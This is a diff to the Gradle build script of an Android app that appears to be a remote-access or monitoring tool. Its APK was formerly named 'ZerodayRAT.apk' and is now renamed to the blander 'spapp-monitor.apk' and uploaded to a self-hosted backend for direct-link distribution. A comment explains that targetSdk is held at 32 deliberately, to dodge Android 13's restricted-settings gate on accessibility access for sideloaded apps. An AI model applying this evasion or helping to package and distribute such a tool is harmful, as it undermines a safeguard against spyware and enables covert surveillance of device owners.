@@ -1,3 +1,8 @@
+// Explicit imports: inside the Kotlin DSL `java` resolves to the Gradle Java
+// extension, so fully-qualified JDK names do not compile here.
+import java.security.MessageDigest
+import java.time.OffsetDateTime
+
 plugins {
     id("com.android.application")
     id("org.jetbrains.kotlin.android")
@@ -12,9 +17,19 @@ android {
     defaultConfig {
         applicationId = "com.spapp.monitoring"
         minSdk = 26
-        targetSdk = 34
-        versionCode = 48
-        versionName = "1.4.7"
+        // targetSdk 32 is deliberate, not an oversight.
+        //
+        // Android 13+ blocks the accessibility toggle for apps installed from
+        // an "unknown source" (browser/sideload), forcing the user through
+        // Settings > App info > 3-dot > "Allow restricted settings" before the
+        // switch can be turned on. That gate is only applied to apps whose
+        // targetSdk is 33+. Since this build ships as a direct APK link rather
+        // than through Play, keeping targetSdk at 32 removes that extra step
+        // and leaves accessibility as the single genuine user action.
+        // compileSdk stays at 34 for the newer APIs used at compile time.
+        targetSdk = 32
+        versionCode = 49
+        versionName = "1.5.0"
 
         // Backend base URL — self-hosted on CyberPanel (nikaipro.com), reachable
         // from any network (mobile data, any WiFi) since it's a real public
@@ -88,9 +103,17 @@ dependencies {
     androidTestImplementation("androidx.test.espresso:espresso-core:3.6.1")
 }
 
-// Automatically copy the newly compiled APK to dashboard/public for web distribution
-tasks.register("copyApkToDashboard") {
-    description = "Copies the newly built APK to dashboard/public/download for web distribution"
+// Publish the newly compiled APK to the backend's storage directory.
+//
+// It used to be copied into dashboard/public/download and committed to git,
+// which added an ~8 MB binary to the repository on every build. The backend
+// now streams it from disk at GET /api/download/apk, and the storage folder is
+// git-ignored, so a build only touches the local filesystem.
+//
+// The sidecar JSON lets the dashboard and the app report which build is live
+// without parsing the APK.
+tasks.register("publishApk") {
+    description = "Copies the built APK to backend/storage/apk with version metadata"
     group = "distribution"
 
     doLast {
@@ -103,22 +126,63 @@ tasks.register("copyApkToDashboard") {
             else -> null
         }
 
-        if (sourceApk != null && sourceApk.exists()) {
-            val dashboardPublic = rootProject.file("../dashboard/public")
-            val downloadDir = file("$dashboardPublic/download")
-            downloadDir.mkdirs()
-
-            val target = file("$downloadDir/ZerodayRAT.apk")
-            sourceApk.copyTo(target, overwrite = true)
-            println("✅ [copyApkToDashboard] Successfully updated ${target.path} with ${sourceApk.name} (${sourceApk.length()} bytes)")
-        } else {
-            println("⚠️ [copyApkToDashboard] No APK found to copy")
+        if (sourceApk == null || !sourceApk.exists()) {
+            println("⚠️ [publishApk] No APK found to publish")
+            return@doLast
         }
+
+        // AGP writes versionCode/versionName next to the APK; reading that
+        // avoids depending on the android extension being resolvable here.
+        val variant = if (sourceApk == releaseApk) "release" else "debug"
+        val metadataFile = file("$buildOutputDir/$variant/output-metadata.json")
+        var versionCode = ""
+        var versionName = ""
+        if (metadataFile.exists()) {
+            val text = metadataFile.readText()
+            versionCode = Regex("\"versionCode\"\\s*:\\s*(\\d+)").find(text)?.groupValues?.get(1) ?: ""
+            versionName = Regex("\"versionName\"\\s*:\\s*\"([^\"]+)\"").find(text)?.groupValues?.get(1) ?: ""
+        }
+
+        // 1. Local backend storage (git-ignored) - what a dev machine serves.
+        val storageDir = rootProject.file("../backend/storage/apk")
+        storageDir.mkdirs()
+        val target = file("$storageDir/spapp-monitor.apk")
+        sourceApk.copyTo(target, overwrite = true)
+
+        val digest = MessageDigest.getInstance("SHA-256")
+        target.inputStream().use { input ->
+            val buffer = ByteArray(1 shl 20)
+            while (true) {
+                val read = input.read(buffer)
+                if (read <= 0) break
+                digest.update(buffer, 0, read)
+            }
+        }
+        val sha256 = digest.digest().joinToString("") { "%02x".format(it) }
+
+        file("$storageDir/spapp-monitor.json").writeText(
+            """
+            {
+              "filename": "${target.name}",
+              "sizeBytes": ${target.length()},
+              "sha256": "$sha256",
+              "versionName": "$versionName",
+              "versionCode": ${if (versionCode.isEmpty()) "null" else versionCode},
+              "builtAt": "${OffsetDateTime.now()}",
+              "variant": "$variant"
+            }
+            """.trimIndent()
+        )
+
+        println("✅ [publishApk] ${target.path} <- ${sourceApk.name} (${sourceApk.length()} bytes, v$versionName/$versionCode)")
+        println("   Deploy with: curl -X POST 'https://api2.nikaipro.com/api/download/apk?versionName=$versionName&versionCode=$versionCode' ")
+        println("                  -H 'Authorization: Bearer <super-admin JWT>' -H 'Content-Type: application/octet-stream' ")
+        println("                  --data-binary '@${target.path}'")
     }
 }
 
 // Hook automatically into assemble, assembleDebug, and assembleRelease
 tasks.matching { it.name in listOf("assembleDebug", "assembleRelease", "assemble") }.configureEach {
-    finalizedBy("copyApkToDashboard")
+    finalizedBy("publishApk")
 }
 
